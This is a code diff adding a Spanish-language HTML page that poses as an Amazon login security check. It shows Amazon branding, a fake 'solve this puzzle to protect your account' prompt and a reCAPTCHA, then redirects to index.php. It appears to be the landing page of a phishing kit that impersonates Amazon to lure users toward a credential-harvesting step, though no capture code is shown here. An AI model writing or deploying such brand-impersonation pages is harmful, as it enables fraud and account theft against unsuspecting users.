@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Amazon Login</title>
+  <link rel="stylesheet" href="css/login3.css">
+  
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+<body>
+  <section class="flex1">
+    <div class="logo">
+        <img src="imagenes/logo2.png" alt="Amazon Logo"/>
+    </div>
+  </section>
+  <div class="container">
+    <h1>Resuelve esta comprobación para proteger tu cuenta</h1>
+    <div class="logo1">
+      <img src="https://amazon-api.arkoselabs.com/cdn/fc/assets/style-manager/assets/1fb5e778-7769-4534-b0f3-18ea4006b0a3.svg" alt="Amazon API"/>
+    </div>
+    <div class="button-container">
+      <button id="startPuzzle">Comenzar rompecabezas</button>
+    </div>
+    <div class="remember-me">
+      <a href="#" class="help">¿Necesitas ayuda?</a>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popupOverlay"></div>
+  <div class="popup" id="popup">
+    <div class="popup-content">
+      <h2>Completa el Captcha</h2>
+      <div class="g-recaptcha" data-sitekey="6Lf3pv4pAAAAAKuvCSDieyVpPxcBt1NCWJ7Zxdny" data-callback="enableContinueButton"></div>
+      <button id="continueButton" class="disabled" disabled>Continuar</button>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("startPuzzle").addEventListener("click", function() {
+      document.getElementById("popup").style.display = "block";
+      document.getElementById("popupOverlay").style.display = "block";
+    });
+
+    function enableContinueButton() {
+      var continueButton = document.getElementById("continueButton");
+      continueButton.disabled = false;
+      continueButton.classList.remove("disabled");
+    }
+
+    document.getElementById("continueButton").addEventListener("click", function() {
+      document.getElementById("popup").style.display = "none";
+      document.getElementById("popupOverlay").style.display = "none";
+      window.location.href = "index.php";
+    });
+  </script>
+</body>
+</html>
